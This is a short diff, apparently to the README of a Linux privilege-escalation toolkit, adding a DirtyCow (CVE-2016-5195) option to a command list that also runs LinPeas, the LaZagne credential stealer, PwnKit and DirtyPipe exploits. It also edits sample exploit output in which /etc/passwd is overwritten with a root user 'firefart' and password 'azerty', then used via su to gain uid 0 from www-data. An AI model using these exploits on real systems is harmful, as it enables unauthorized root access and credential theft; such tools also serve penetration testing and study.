@@ -41,6 +41,7 @@ Commands:
    -LinPeas       Execute LinPeas
    -LaZagne       Execute LaZagne
    -Overlays      Compilation + execution binaire - CVE-2015-1328
+   -DirtyCow      Compilation + execution binaire - CVE-2016-5195
    -PwnKit64/32   PwnKit64/32 - CVE-2021-4034
    -DirtyPipe     DirtyPipe - CVE-2022-0847
    -SudoHost      Sudo Hostname - CVE-2025-32462   
@@ -176,7 +177,10 @@ You can log in with the username 'firefart' and the password 'azerty'.
 DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
 Binary file (standard input) matches
 
-firefart@ubuntu:~# id
+www-data@ubuntu:/tmp/fullEx$ su - firefart
+Password: azerty
+
+firefart@ubuntu:/tmp/fullEx$# id
 id
 uid=0(firefart) gid=0(root) groups=0(root)
 ```
